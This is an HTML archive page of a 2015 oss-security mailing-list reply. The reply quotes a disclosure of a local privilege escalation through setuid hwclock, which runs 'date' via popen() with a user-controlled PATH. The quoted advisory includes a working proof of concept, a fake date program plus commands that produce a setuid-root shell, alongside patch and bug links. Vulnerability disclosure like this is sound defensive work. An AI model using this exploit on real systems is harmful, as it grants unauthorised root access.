@@ -1,0 +1,265 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: hwclock(8) SUID privilege escalation</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="11">[&lt;prev]</a> <a href="13">[next&gt;]</a> <a href="10">[&lt;thread-prev]</a> <a href="14">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-id: &lt;728CB05F-659E-429E-A59D-577F4251DFDA&#64;me.com&gt;
+Date: Tue, 26 May 2015 09:19:13 -0400
+From: "Larry W. Cashdollar" &lt;larry0&#64;...com&gt;
+To: Open Source Security &lt;oss-security&#64;...ts.openwall.com&gt;
+Subject: Re: hwclock(8) SUID privilege escalation
+
+It’s not setuid root on my Ubuntu system.
+
+larry&#64;...p:~$ which hwclock
+/sbin/hwclock
+larry&#64;...p:~$ ls -l /sbin/hwclock 
+-rwxr-xr-x 1 root root 46764 Feb 12 13:54 /sbin/hwclock
+larry&#64;...p:~$ uname -a
+Linux meep 3.13.0-48-generic #80-Ubuntu SMP Thu Mar 12 11:16:18 UTC 2015 i686 i686 i686 GNU/Linux
+larry&#64;...p:~$ cat /etc/issue
+Ubuntu 14.04.2 LTS \n \l
+
+
+
+
+&gt; On May 26, 2015, at 6:47 AM, up201407890&#64;...nos.dcc.fc.up.pt wrote:
+&gt; 
+&gt; Hello,
+&gt; 
+&gt; During a recent assessment I have stumbled across a system which had
+&gt; hwclock(8) setuid root
+&gt; 
+&gt; hwclock is a part of util-linux, all versions affected
+&gt; 
+&gt; $ man hwclock | sed -n '223,231p'
+&gt; 
+&gt; Users access and setuid
+&gt;       Sometimes, you need to install hwclock setuid root. If you
+&gt; want users other than the superuser to be able to display the clock
+&gt; value using the direct ISA I/O
+&gt;       method,  install  it setuid root. If you have the /dev/rtc
+&gt; interface on your system or are on a non-ISA system, there's probably
+&gt; no need for users to use the
+&gt;       direct ISA I/O method, so don't bother.
+&gt; 
+&gt;       In any case, hwclock will not allow you to set anything unless
+&gt; you have the superuser real uid.  (This  is  restriction  is  not
+&gt; necessary  if  you  haven't
+&gt;       installed setuid root, but it's there for now).
+&gt; 
+&gt; <a href="http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L2041" rel="nofollow">http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L2041</a>
+&gt; 
+&gt; "The program is designed to run setuid superuser, since we need to be able
+&gt; to do direct I/O. (More to the point: we need permission to execute the
+&gt; iopl() system call). (However, if you use one of the methods other than
+&gt; direct ISA I/O to access the clock, no setuid is required)."
+&gt; 
+&gt; <a href="http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L1920" rel="nofollow">http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L1920</a>
+&gt; 
+&gt; "program is designed to run setuid (in some situations)"
+&gt; 
+&gt; 
+&gt; Some comments in code and unfortunately also man page
+&gt; advertising that setuid is no problem. That's pretty stupid promise.
+&gt; 
+&gt; 
+&gt; from util-linux/2.26.2-5/sys-utils/hwclock.c
+&gt; <a href="http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L748" rel="nofollow">http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L748</a>
+&gt; 
+&gt; 
+&gt; /* Quotes in date_opt would ruin the date command we construct. */
+&gt;        if (strchr(date_opt, '"') != NULL) {
+&gt;                warnx(_
+&gt;                      ("The value of the --date option is not a valid date.\n"
+&gt;                       "In particular, it contains quotation marks."));
+&gt;                return 12;
+&gt;        }
+&gt; 
+&gt;        sprintf(date_command, "date --date=\"%s\" +seconds-into-epoch=%%s",
+&gt;                date_opt);
+&gt; 				[...]
+&gt; 
+&gt; 	date_child_fp = popen(date_command, "r");
+&gt; 
+&gt; 				[...]
+&gt; 
+&gt; hwclock uses popen() to date_command which is 'date --date=\"%s\"
+&gt; +seconds-into-epoch=%%s'
+&gt; 
+&gt; Exploiting is trivial, since $PATH is user-controlled
+&gt; 
+&gt; 
+&gt; 
+&gt; $ ls -l /usr/sbin/hwclock
+&gt; -rwsr-sr-x. 1 root root 48096 Nov 27 14:10 /usr/sbin/hwclock
+&gt; $ cat &gt; date.c;gcc date.c -o date
+&gt; main()
+&gt; {
+&gt; chown("/tmp/sploit", 0, 0);
+&gt; chmod("/tmp/sploit", 04755);
+&gt; }
+&gt; ^D
+&gt; $ cp /bin/sh /tmp/sploit
+&gt; $ PATH=".:$PATH" /usr/sbin/hwclock --set --date="05/23/2015 20:35:37"
+&gt; hwclock: The date command issued by hwclock returned unexpected results.
+&gt; The command was:
+&gt;  date --date="05/23/2015 20:35:37" +seconds-into-epoch=%s
+&gt; The response was:
+&gt; 
+&gt; hwclock: No usable set-to time.  Cannot set clock.
+&gt; $ /tmp/sploit
+&gt; # id
+&gt; euid=0(root) groups=0(root)
+&gt; 
+&gt; 
+&gt; Can a CVE be assigned?
+&gt; 
+&gt; 
+&gt; Notes:
+&gt; 
+&gt; Please note that this is possible on Debian-derived (and therefore Ubuntu),
+&gt; because /bin/sh is provided by dash which does NOT make use
+&gt; of privmode (does not drop privileges if ruid != euid, unlike bash),
+&gt; which is a very stupid idea.
+&gt; 
+&gt; privmode is surprisingly effective at mitigating some common vulnerability
+&gt; classes and misconfigurations, and it has been around since mid 90's.
+&gt; Indeed, Chet Ramey (bash author and maintainer) explains that the
+&gt; purpose of this is to prevent "bogus system(3)/popen(3) calls in
+&gt; setuid executables"
+&gt; 
+&gt; 
+&gt; TL;DR: When setuid root, hwclock relies on $PATH to popen() the date
+&gt; command, meaning privilege escalation can occur since $PATH is
+&gt; user-controlled.
+&gt; 
+&gt; 
+&gt; Patches are available, signed off by Karel Zak &lt;kzak&#64;...hat.com&gt;
+&gt; <a href="https://github.com/karelzak/util-linux/commit/687cc5d58942b24a9f4013c68876d8cbea907ab1" rel="nofollow">https://github.com/karelzak/util-linux/commit/687cc5d58942b24a9f4013c68876d8cbea907ab1</a>
+&gt; 
+&gt; Initial bug report:
+&gt; <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=786804" rel="nofollow">https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=786804</a>
+&gt; 
+&gt; 
+&gt; Thanks,
+&gt; Federico Bento.
+&gt; 
+&gt; ----------------------------------------------------------------
+&gt; This message was sent using IMP, the Internet Messaging Program.
+&gt; 
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
